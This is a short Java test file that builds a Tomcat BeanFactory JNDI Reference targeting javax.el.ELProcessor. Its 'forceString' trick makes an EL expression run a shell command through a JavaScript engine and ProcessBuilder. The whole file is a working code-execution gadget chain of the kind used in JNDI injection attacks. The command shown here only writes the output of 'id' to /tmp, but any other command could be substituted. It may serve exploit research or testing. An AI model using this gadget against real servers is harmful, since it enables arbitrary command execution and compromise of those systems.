import javax.naming.Reference;
import javax.naming.StringRefAddr;
import org.apache.naming.factory.BeanFactory;

public class TestBF {
    public static void main(String[] a) throws Exception {
        String expr = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','id > /tmp/bftest 2>&1']).start()\")";
        Reference ref = new Reference("javax.el.ELProcessor", "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", expr));
        Object o = new BeanFactory().getObjectInstance(ref, null, null, null);
        System.out.println("BF result: " + o);
    }
}
